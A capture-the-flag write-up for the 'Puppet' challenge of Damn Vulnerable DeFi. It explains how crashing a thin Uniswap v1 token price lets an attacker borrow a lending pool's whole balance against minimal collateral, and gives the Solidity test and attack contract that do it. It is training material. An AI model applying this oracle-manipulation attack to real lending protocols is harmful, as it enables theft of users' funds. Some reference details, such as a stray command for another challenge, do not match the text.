# Puppet CTF Writeup

## Challenge Description
There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.


Rescue all funds from the pool and deposit them into the designated recovery account.

## The Exploit Strategy
The Puppet contract provides borrow functionality but to get the price it depended on Uniswap reserves and depending on uniswap reserve is vuln. so we gonna take eth by provding tokens and manipulate reserves of token. Here in pool token reserve has increased and eth has been reduced so with little bit of with we can drain all of token

Here’s how the exploit unfolds step by step:

1. Dumping DVT Tokens: The attacker begins by dumping a large quantity of DVT tokens into the Uniswap liquidity pool. This sudden influx dramatically increases the token supply in the pool, causing the price of DVT to plummet.
2. Changing Price Perception: With the DVT price significantly depressed due to the inflated token supply, the PuppetPool contract now perceives DVT as being nearly worthless.
3. Minimal Collateral: The attacker then deposits a small amount of ETH as collateral in the PuppetPool. Because the contract believes that DVT is almost worthless — thanks to the manipulated Uniswap price — it doesn’t require a substantial ETH deposit.
4. Borrowing Tokens: With minimal ETH collateral, the attacker can borrow or effectively steal all the DVT tokens from the PuppetPool. The contract’s flawed price perception facilitates this.

## Solution

```solidity
    function test_puppet() public checkSolvedByPlayer {
        // uniswapV1Exchange.ethToTokenSwapOutput
        // (1e18, block.timestamp * 2);
        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV1Exchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, block.timestamp * 2);
        Attack attacker = new Attack(recovery, address(lendingPool), address(token));
        (bool res,) = address(attacker).call{value: address(player).balance}("");
        require(res, "Attack failed");
        attacker.attack();
    }
```
```solidity
contract Attack {
    address receiver;
    PuppetPool lendingPool;
    DamnValuableToken token;

    constructor(address _receiver, address _lendingPool, address _token) {
        receiver = _receiver;
        lendingPool = PuppetPool(_lendingPool);
        token = DamnValuableToken(_token);
    }

    function attack() public {
        // Borrow 100 tokens
        lendingPool.borrow{value: address(this).balance}(token.balanceOf(address(lendingPool)), address(this));
        token.transfer(receiver, token.balanceOf(address(this)));
    }

    receive() external payable {
        // Deposit the ETH received
        // lendingPool.deposit{value: msg.value}();
    }
}
```




## References
- [Solution Link](https://docs.soliditylang.org/)
- [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/)

 forge test --mp test/selfie/Selfie.t.sol -vvvv




